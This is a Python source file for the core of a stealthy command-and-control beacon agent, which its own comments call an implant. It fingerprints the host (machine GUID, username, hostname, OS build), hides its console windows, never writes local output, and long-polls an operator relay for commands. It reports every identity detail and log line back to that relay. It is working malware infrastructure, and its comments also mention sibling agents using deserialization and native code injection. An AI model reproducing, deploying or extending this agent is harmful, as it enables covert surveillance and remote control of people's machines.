# -*- coding: utf-8 -*-
# python-agent — the cross-platform Python HTTP-beacon agent core (the JScript and
# PowerShell agents' interpreter-native twin). One top-level symbol ONLY: the host
# master embeds this text verbatim, then calls runAgent(). Nested helpers read the
# enclosing scope and write loop state through the `box` dict (Python 2 has no
# `nonlocal`, so a mutable cell is the 2/3-compatible rebind). Returns 'exit' or
# 'fail' — the host's to act on. Python 2.6+ / 3.x, stdlib only, no local echo.


def runAgent():
    import os
    import platform
    import socket
    import struct
    import subprocess
    import sys
    import uuid

    try:
        from urllib.request import Request, urlopen
    except ImportError:
        from urllib2 import Request, urlopen

    is_windows = sys.platform == 'win32'
    box = {'exiting': False, 'inShip': False, 'beaconUrl': '', 'identity': []}

    # log() = relay ship ONLY (zero local echo — no print, ever). Every line is POSTed
    # with X-Log-Only: 1: the relay answers immediately (no long-poll hold) and
    # broadcasts an agent_log event to the operator's events feed. NEVER fatal — a
    # failed ship is swallowed in silence — and the in-ship guard keeps a failing relay
    # from recursing. Body = one frame holding the UTF-8 line. Each call is one
    # synchronous round-trip that stalls the agent loop — keep log() calls to
    # milestones, never inside tight loops.
    def log(line):
        if box['inShip'] or not box['beaconUrl'] or not box['identity']:
            return
        box['inShip'] = True
        try:
            data = line.encode('utf-8')
            headers = dict(box['identity'])
            headers['X-Log-Only'] = '1'
            try:
                resp = urlopen(Request(box['beaconUrl'], data=struct.pack('<I', len(data)) + data, headers=headers), timeout=15)
                try:
                    resp.read()
                finally:
                    resp.close()
            except Exception:
                pass
        finally:
            box['inShip'] = False

    # ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
    # The body is a stream of [u32le length][bytes] frames; one POST carries every
    # response owed since the last one, and the answer carries every queued command
    # (same contract as the JScript, C#, and PowerShell agents — no encoding
    # negotiation). Python has a native bytes type on both major versions, so the
    # JScript ADODB/cp1252 COM bridge is unnecessary here: frames are packed with
    # struct and the answer is read into a bytearray (whose indexing yields ints on
    # 2 AND 3 — the one byte type that behaves identically across both).
    def build_body(frames):
        parts = []
        for f in frames:
            parts.append(struct.pack('<I', len(f)))
            parts.append(bytes(f))
        return b''.join(parts)

    def parse_frames(data):
        frames = []
        i = 0
        while i + 4 <= len(data):
            n = struct.unpack_from('<I', data, i)[0]
            i += 4
            frames.append(bytes(data[i:i + n]))
            i += n
        return frames

    # One POST to the beacon endpoint with the full identity header set. urlopen's
    # single timeout covers resolve+connect+send+the long-poll wait for the first
    # answer byte (so it carries the 45s receive budget the relay's 20-30s hold
    # fits in). Certificate validation stays AT THE INTERPRETER'S DEFAULT — no
    # unverified-context global (the relay serves a public cert; the old loader's
    # disable was for unsigned GitHub-Release payloads this agent never fetches).
    def post(body, timeout_s):
        headers = dict(box['identity'])
        headers['Content-Type'] = 'application/octet-stream'
        return urlopen(Request(box['beaconUrl'], data=body, headers=headers), timeout=timeout_s)

    # ── machine identity ────────────────────────────────────────────
    # CANONICAL machine uuid = whatever Guid.ToString()-shaped value the platform's
    # stable identifier yields, normalized to 8-4-4-4-12 lowercase hex: Windows pins
    # the MachineGuid view an x86 process sees (the Wow6432Node copy on a 64-bit
    # host — the same view every other breed derives, so host bitness can never mint
    # a second agent row), Linux reads /etc/machine-id, macOS the IOPlatformUUID.
    # Every source failing returns '' — the header is OMITTED below, never sent as
    # '' and never as a zero GUID (all zeros is valid-shaped and would key ONE
    # shared phantom row for every machine where detection failed); the relay then
    # treats the agent as identity-less and derives a fallback uuid itself.
    def normalize_guid(raw):
        h = ''.join(c for c in raw.lower() if c in '0123456789abcdef')
        if len(h) != 32:
            return ''
        return h[:8] + '-' + h[8:12] + '-' + h[12:16] + '-' + h[16:20] + '-' + h[20:]

    # subprocess with a hidden console window (pythonw hosts): STARTUPINFO +
    # STARTF_USESHOWWINDOW exists on Windows Python 2.6+ and 3.x alike.
    def hidden_popen(args):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        return subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=si)

    def popen_text(args):
        try:
            out = hidden_popen(args).communicate()[0]
            if not isinstance(out, str):
                out = out.decode('utf-8', 'replace')
            return out
        except Exception:
            return ''

    def read_reg_machineguid(path):
        out = popen_text(['reg', 'query', 'HKLM\\' + path, '/v', 'MachineGuid'])
        for line in out.split('\n'):
            if 'MachineGuid' in line and 'REG_SZ' in line:
                return normalize_guid(line.split('REG_SZ')[-1])
        return ''

    def load_guid():
        guid = ''
        if is_windows:
            host_arch = os.environ.get('PROCESSOR_ARCHITECTURE', '').upper()
            if not os.environ.get('PROCESSOR_ARCHITEW6432') and host_arch in ('AMD64', 'ARM64'):
                # 64-bit host: pin to the canonical x86 view via the explicit Wow6432Node
                # path — the native default view holds a DIFFERENT GUID on many machines
                # and would mint a second agent row. The default-view fallback below fires
                # ONLY when Wow6432Node carries no MachineGuid at all (ARM64 Windows: the
                # x86 view simply doesn't exist there, so nothing can be keying on it).
                guid = read_reg_machineguid(r'SOFTWARE\Wow6432Node\Microsoft\Cryptography') \
                    or read_reg_machineguid(r'SOFTWARE\Microsoft\Cryptography')
            else:
                # x86 host on a 64-bit OS (the default view IS the Wow6432Node copy) or a
                # 32-bit OS (single view): default view = canonical.
                guid = read_reg_machineguid(r'SOFTWARE\Microsoft\Cryptography')
            if not guid:
                # Fall back to the SMBIOS hardware UUID; stable across OS reinstalls.
                # (wmic.exe is gone from the newest Windows builds — the miss is silent
                # and the relay's derived uuid covers the host.)
                out = popen_text(['wmic', 'csproduct', 'get', 'uuid'])
                for line in out.split('\n'):
                    guid = guid or normalize_guid(line.strip())
        else:
            for path in ('/etc/machine-id', '/var/lib/dbus/machine-id'):
                try:
                    with open(path, 'rb') as f:
                        guid = normalize_guid(f.read().decode('ascii', 'replace').strip())
                        if guid:
                            break
                except Exception:
                    pass
            if not guid:
                try:
                    with open('/sys/class/dmi/id/product_uuid', 'rb') as f:
                        guid = normalize_guid(f.read().decode('ascii', 'replace').strip())
                except Exception:
                    pass
            if not guid and sys.platform == 'darwin':
                out = popen_text(['ioreg', '-rd1', '-c', 'IOPlatformExpertDevice'])
                for line in out.split('\n'):
                    if 'IOPlatformUUID' in line:
                        tail = line.split('=')[-1].strip().strip('"')
                        guid = guid or normalize_guid(tail)
        return guid

    # A RANDOM per-RUNTIME key — NOT identity. A fresh value on every process launch
    # (minted once below, before the beacon loop, sent on every beacon) so the
    # relay/C2 can tell agent RUNTIMES apart on one machine: the machine uuid above
    # stays THE identity rows are keyed by; the session key distinguishes concurrent
    # or succeeding processes (an upgrade takeover swaps it mid-session). The random
    # fallback only needs uniqueness, not unpredictability — the key identifies, it
    # authorizes nothing.
    def make_session_key():
        try:
            return str(uuid.uuid4())
        except Exception:
            import random
            hexc = '0123456789abcdef'
            key = ''
            for i in range(36):
                key += '-' if i in (8, 13, 18, 23) else hexc[int(random.random() * 16)]
            return key

    def build_identity():
        guid = load_guid()
        arch_map = {'amd64': 'x86_64', 'x86_64': 'x86_64', 'i386': 'i386', 'i686': 'i386',
                    'x86': 'i386', 'arm64': 'aarch64', 'aarch64': 'aarch64', 'armv7l': 'armv7a'}
        machine = platform.machine().lower()
        arch = arch_map.get(machine, machine)
        # The PROCESS arch: on Windows the PROCESSOR_ARCHITECTURE env carries it (an
        # emulated Python reports the emulated arch); elsewhere the interpreter's own
        # pointer width narrows the machine arch (a 32-bit Python on an x86_64 Linux
        # is an i386 process). Undetected values stay '' — the header is OMITTED
        # below, never sent as a placeholder like 'unknown'.
        if is_windows:
            process_arch = arch_map.get(os.environ.get('PROCESSOR_ARCHITECTURE', '').lower(), '')
        else:
            bits = struct.calcsize('P') * 8
            process_arch = {'x86_64': 'i386', 'aarch64': 'armv7a'}.get(arch, arch) if bits == 32 else arch
        platform_name = {'win32': 'Windows', 'darwin': 'Darwin'}.get(sys.platform, platform.system().capitalize() or 'Linux')
        os_version = ''
        build_number = ''
        try:
            if is_windows:
                os_version = platform.version()
                parts = os_version.split('.')
                if len(parts) == 3 and parts[2].isdigit():
                    build_number = parts[2]
            else:
                os_version = platform.release()
        except Exception:
            pass
        # Username via env only — getpass can raise on hosts without a password
        # database, and identity detection must never be fatal.
        username = ''
        for var in ('USERNAME', 'LOGNAME', 'USER'):
            if os.environ.get(var):
                username = os.environ[var]
                break
        hostname = ''
        try:
            hostname = socket.gethostname()
        except Exception:
            hostname = os.environ.get('COMPUTERNAME', '')
        # REQUIRED headers carry compile-time constants. Every detection-derived field
        # is OPTIONAL — undetected values OMIT the header (never '', never a
        # placeholder), so the relay/C2 see "not reported". There is NO Bitness
        # header — the process arch already carries the full width, and
        # x86_64/aarch64 are both 64-bit. Capabilities = 0: this breed has no
        # upgrade path (the 0x0B deserialization chain is CLR-hosted; 0x0C native
        # injection is the C# agent's) — Exit needs no bit, and the mask honestly
        # reports an implant that registers, beacons, and exits.
        pairs = [
            ('X-Api-Version', '1'),
            ('X-Device-Id', guid),
            ('X-Session-Id', make_session_key()),
            ('X-Device-Name', hostname),
            ('X-User-Id', username),
            ('X-Device-Arch', arch),
            ('X-App-Arch', process_arch),
            ('X-Platform', platform_name),
            ('X-OS-Version', os_version),
            ('X-OS-Build', build_number),
            ('X-Client-Id', '4'),
            ('X-Client-Features', '0000000000000000'),
        ]
        return [(name, value) for name, value in pairs if value]

    # Command layout: [opcode][corrId:u32le][payload...]. Every reply echoes the id
    # after its status: [status:u32le][corrId:u32le]. Id 0 = unmatched.
    def dispatch_command(frame):
        b = bytearray(frame)
        corr_id = struct.unpack_from('<I', b, 1)[0] if len(b) >= 5 else 0

        def reply(status):
            return struct.pack('<II', status, corr_id)

        if len(b) >= 1 and b[0] == 10:
            box['exiting'] = True
            return None
        log('command opcode %s unknown - replying status 2' % (b[0] if b else 'none'))
        return reply(2)

    # ── the beacon loop ─────────────────────────────────────────────
    box['beaconUrl'] = os.environ.get('H_URL', '')
    if not box['beaconUrl']:
        # log() is inert pre-identity — the missing-endpoint failure is local-silent
        # by design, the same contract the other breeds ship.
        return 'fail'
    box['identity'] = build_identity()
    uuid_for_log = ''
    for name, value in box['identity']:
        if name == 'X-Device-Id':
            uuid_for_log = value
    log('Python agent beaconing to %s as %s' % (box['beaconUrl'], uuid_for_log or 'an unidentified machine'))
    pending = []
    while not box['exiting']:
        try:
            resp = post(build_body(pending) if pending else b'', 45)
            try:
                answer = resp.read()
            finally:
                resp.close()
        except Exception:
            # Any non-200 or failed POST is fatal — the contract has no retry.
            return 'fail'
        pending = []
        # Empty answer = nothing queued — re-POST immediately (the relay's 20-30s
        # long-poll hold is the agent's only idle sleep).
        if len(answer) == 0:
            log('idle - empty answer')
            continue
        for frame in parse_frames(bytearray(answer)):
            reply_bytes = dispatch_command(frame)
            if box['exiting']:
                log('exit')
                return 'exit'
            if reply_bytes is not None:
                pending.append(reply_bytes)
    return 'exit'
